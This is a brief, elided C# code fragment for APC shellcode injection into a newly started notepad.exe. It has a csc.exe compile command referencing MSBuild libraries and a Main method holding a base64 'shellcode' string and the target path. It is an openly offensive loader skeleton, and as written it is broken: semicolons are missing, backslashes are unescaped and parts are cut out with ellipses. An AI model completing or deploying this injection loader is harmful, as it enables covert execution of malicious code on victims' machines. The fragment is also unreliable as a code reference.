...
//csc.exe /reference:"Microsoft.Build.Framework.dll";"Microsoft.Build.Tasks.v4.0.dll";"Microsoft.Build.Utilities.v4.0.dll" /target:library win.cs
...
public class ApcInjectionNewProcess{
	...
	//a = shellcode en b64		b = target process to inject into C:\Windows\notepad.exe
	public static void Main()
	{	
		string a= "cwBsAG0AZwByAA=="
		string b= "C:\Windows\notepad.exe"
